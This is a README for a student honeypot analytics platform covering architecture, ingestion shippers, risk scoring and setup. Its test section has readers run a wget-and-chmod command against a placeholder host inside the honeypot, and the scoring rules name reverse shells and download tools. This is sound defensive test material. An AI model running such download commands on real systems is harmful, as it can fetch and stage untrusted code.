# Honeypots with Attack Analytics

Enterprise-grade honeypot attack analytics platform — MSc Computer Science major project.

All 12 development phases are complete: SOC dashboard, email authentication, real-time
SMTP alerts, WebSocket live updates, advanced analytics, threat intelligence, a weighted
risk scoring engine, attack replay, PDF/CSV/Excel reports, advanced search, a persistent
notification center, and admin-configurable runtime settings.

## Architecture

```
Presentation Layer   -> React + TypeScript SOC Dashboard
API Layer             -> FastAPI routers (app/api/v1/endpoints)
Service Layer         -> Business logic (app/services)
Repository Layer      -> Data access (app/repositories)
Database              -> PostgreSQL (SQLAlchemy models + Alembic migrations, 8 revisions)
```

Honeypot integration: **Cowrie** (SSH/Telnet). A dedicated `cowrie-shipper` service tails
Cowrie's JSON log, normalizes each session (including file downloads/uploads for Attack
Replay), and POSTs it to the backend's `/api/v1/attacks/ingest` endpoint.

## What's included

**Phase 1 — Core platform & SOC dashboard**: JWT auth, RBAC (admin/analyst/viewer), rate
limiting, audit-ready schema, glassmorphic dark SOC UI, live dashboard widgets.

**Phase 2 — Email authentication**: login by email, Forgot/Reset/Change Password, optional
email verification, "Remember Me".

**Phase 3 — Real-time email alerts**: SMTP (Gmail App Password / Mailtrap / any relay),
HTML alert emails with all required fields, background dispatch that never blocks ingestion.

**Phase 4 — WebSockets**: authenticated live feed, instant dashboard/attack-monitor updates,
Live Attack Feed widget, connection status indicator.

**Phase 5 — Advanced Analytics**: attack heatmap, hourly/weekly/monthly trends, risk
distribution, session duration stats, top commands.

**Phase 6 — Threat Intelligence**: AbuseIPDB, VirusTotal, AlienVault OTX — concurrent
lookups, 24h caching, graceful per-provider degradation if a key isn't configured. Also
includes **attacker geolocation** (city, region, country, ISP, coordinates) via
ip-api.com — no API key required — with an embedded map in the Threat Intel panel.

**Phase 7 — Risk Scoring Engine**: weighted 0-100 score (failed logins, SSH success,
wget/curl, chmod, reverse shells, privilege escalation) mapped to LOW/MEDIUM/HIGH/CRITICAL.

**Phase 8 — Attack Replay**: full session timeline (login → commands → downloads →
uploads → disconnect) with animated playback.

**Phase 9 — Reports**: Daily/Weekly/Monthly, exportable as PDF, Excel, or CSV — all three
render from the same underlying data so they can't disagree.

**Phase 10 — Advanced Search**: filter by IP, country, username, password, command,
severity, date range, session ref — all combinable.

**Phase 11 — Notification Center**: persistent alert history, unread count, mark as
read, dismiss, email delivery status per notification.

**Phase 12 — Settings**: SMTP, admin email, notification threshold, session timeout, and
retention policy are all admin-configurable at runtime (encrypted-at-rest SMTP password,
changes take effect immediately — no restart required). Includes a one-click "Run
Retention Cleanup" and "Send Test Email".

## Multi-honeypot support (in progress)

The platform supports honeypot engines beyond Cowrie via the same normalized
ingestion pipeline (`/api/v1/attacks/ingest`) — no new endpoints or dashboard
widgets needed per protocol; each honeypot just needs a **shipper** that
translates its native log format into the existing ingestion contract.

**Done and tested — Dionaea (HTTP, FTP, SMB):** one shipper (`dionaea-shipper/`),
one `dionaea-01` honeypot entity handling all three protocols (matching how
Cowrie already handles SSH+Telnet from one instance). Verified end-to-end
against live Postgres: session bucketing per protocol, FTP login+file-transfer
capture, SMB exploit/shellcode detection, structured HTTP request metadata —
all round-tripped correctly through ingestion → storage → Attack Replay.
Also fixed a real gap this surfaced: the risk-scoring engine didn't recognize
exploit/shellcode signatures or count file transfers at all (even for Cowrie)
— both are now scored, with zero change to existing Cowrie SSH scoring math.

**Log-shipping pipeline fix (root cause resolved):** the shared volume was
previously mounted on `/opt/dionaea/var/log/dionaea`, but Dionaea's `log_json`
ihandler actually writes to `@DIONAEA_STATEDIR@` (`/opt/dionaea/var/lib/dionaea`)
— and `log_json` isn't enabled by default at all. `docker-compose.yml` now
mounts `dionaea_logs` on the correct `var/lib/dionaea` path and bind-mounts
`dionaea-config/ihandlers-enabled/` to enable `log_json`, so
`/dionaea-logs/dionaea.json` is guaranteed to exist and be populated.
`dionaea-shipper/shipper.py` was also updated to parse Dionaea's real,
documented `log_json` schema (a **nested** `{"connection": {...}}` object,
not the flat fields it previously assumed) with a legacy-flat fallback for
resilience across Dionaea builds. `SESSION_IDLE_TIMEOUT_SECONDS` was lowered
to `5` for near-real-time ingestion. Run `verify_attacks.ps1` (or `setup.bat`,
which runs it automatically) to confirm all 5 protocols are ingesting live.

**Not yet built:** OpenCanary (DNS, RDP, MQTT, MySQL, MSSQL, PostgreSQL),
Mailoney (SMTP), Conpot (ICS/Modbus). The schema, ingestion API, and every
dashboard widget already support these — each remaining honeypot is "write a
shipper," not "extend the backend."

## Theme

Dark mode is the default, matching a professional SOC aesthetic. A
Dark/Light toggle sits in the dashboard header (top-right); the choice
persists across reloads via `localStorage`. Implemented with CSS custom
properties driving the existing `soc.*` Tailwind color tokens
(`frontend/src/index.css`, `frontend/src/context/ThemeContext.tsx`), so the
whole app re-themes consistently without per-component changes.

## Verifying the pipeline

`verify_attacks.ps1` sends a benign test payload to each of the 5 emulated
protocol ports (SSH 2222, Telnet 2223, HTTP 8080, FTP 2121, SMB 4450), waits
for the shippers to flush, then queries the backend API and prints a
pass/fail table per protocol. `setup.bat` runs it automatically after first
startup; it can also be run standalone once the platform is up:

```powershell
.\verify_attacks.ps1
```

## Packaging for distribution

To produce a distributable `honeypot-platform.zip` containing everything
needed to run the platform (`setup.bat`, `run.bat`, `docker-compose.yml`,
`verify_attacks.ps1`, `frontend/`, `backend/`, the shippers, `nginx/`, and
`.env.example`), from the **parent** directory of `honeypot-platform/`:

**Windows (PowerShell):**
```powershell
Compress-Archive -Path "honeypot-platform" -DestinationPath "honeypot-platform.zip" -Force
```

**Linux/Mac:**
```bash
zip -r honeypot-platform.zip honeypot-platform \
  -x "*/node_modules/*" "*/dist/*" "*/__pycache__/*" "*/.venv/*" "*/.env"
```

Exclude `node_modules/`, `dist/`, `__pycache__/`, and any local `.env` (which
may hold real secrets) before distributing.

## Requirements

- Docker Desktop (Windows/Mac) or Docker Engine + Compose (Linux)
- ~4GB free RAM for all containers

## Quick start (Windows)

```
1. Double-click setup.bat   (checks Docker, creates .env, builds images)
2. Double-click run.bat     (starts everything, opens http://localhost)
```

## Quick start (Mac/Linux)

```bash
cp .env.example .env
docker compose build
docker compose up -d
```

Then open:
- **Dashboard**: http://localhost
- **API docs (Swagger)**: http://localhost:8000/api/v1/docs
- **Cowrie SSH honeypot**: `ssh test@localhost -p 2222` (any credentials are accepted and logged)

Default login: `admin` / the password set as `DEFAULT_ADMIN_PASSWORD` in `.env`.

## Configuring email alerts, threat intel, and other settings

Two ways to configure the platform:
1. **`.env` file** — used to seed initial defaults on first startup.
2. **Settings page (recommended)** — log in as admin → Settings. Changes to SMTP,
   admin alert email, notification threshold, session timeout, and retention policy
   take effect immediately, no restart needed.

Threat intelligence (AbuseIPDB/VirusTotal/OTX) API keys are still `.env`-only for now
(free-tier keys, one per provider — see `.env.example` for signup links).

## Generating attack data to see the dashboard populate

```bash
ssh anything@localhost -p 2222
# try a few fake username/password combinations, run a couple of commands
# (try `wget http://x/y.sh && chmod +x y.sh` to trigger a HIGH/CRITICAL alert), then exit
```

## Useful commands

```bash
docker compose logs -f backend        # backend logs
docker compose logs -f cowrie-shipper # see sessions being shipped
docker compose down                   # stop everything
docker compose down -v                # stop and wipe the database
```

## Project structure

```
backend/
  app/
    core/          # config, security, logging, exceptions, rate limiting, crypto
    models/        # SQLAlchemy ORM models
    schemas/       # Pydantic request/response contracts
    repositories/  # data access layer
    services/       # business logic (risk scoring, alerts, reports, threat intel...)
    api/v1/         # FastAPI routers
  alembic/          # database migrations (8 revisions)
frontend/
  src/
    api/            # typed API client
    context/        # auth + live WebSocket state
    components/     # reusable UI
    pages/          # route-level views (12 pages)
cowrie-shipper/      # Cowrie log -> ingestion API adapter
nginx/                # reverse proxy config (WebSocket-aware)
docker-compose.yml
setup.bat / run.bat
```
